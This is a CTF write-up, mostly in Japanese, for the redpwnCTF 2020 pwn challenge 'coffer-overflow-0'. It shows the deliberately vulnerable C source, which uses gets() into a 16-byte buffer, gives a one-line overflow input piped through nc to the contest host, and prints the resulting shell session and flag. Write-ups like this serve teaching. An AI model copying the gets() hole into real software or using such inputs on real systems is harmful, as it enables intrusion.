# coffer-overflow-0:pwn:179pts
Can you fill up the coffers? We even managed to find the source for you.  
nc 2020.redpwnc.tf 31199  
[coffer-overflow-0](coffer-overflow-0)　　　　[coffer-overflow-0.c](coffer-overflow-0.c)  

# Solution
coffer-overflow-0とソースが与えられる。  
ソースは以下のようになっている。  
```c:coffer-overflow-0.c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code != 0) {
    system("/bin/sh");
  }
}
```
codeの中身を書き換えればいいようだ。  
nameをオーバーフローさせればよいことがすぐにわかる。  
スタックの配置など考えなくてもよいので適当に文字を増やしながら入力すると以下でシェルが得られた。  
lsしてflag.txtをcatする。  
```bash
$ (echo AAAAAAAAAAAAAAAAAAAAAAAAA; cat) | nc 2020.redpwnc.tf 31199
Welcome to coffer overflow, where our coffers are overfilling with bytes ;)
What do you want to fill your coffer with?
ls
Makefile
bin
coffer-overflow-0
coffer-overflow-0.c
dev
flag.txt
lib
lib32
lib64
cat flag.txt
flag{b0ffer_0verf10w_3asy_as_123}
```

## flag{b0ffer_0verf10w_3asy_as_123}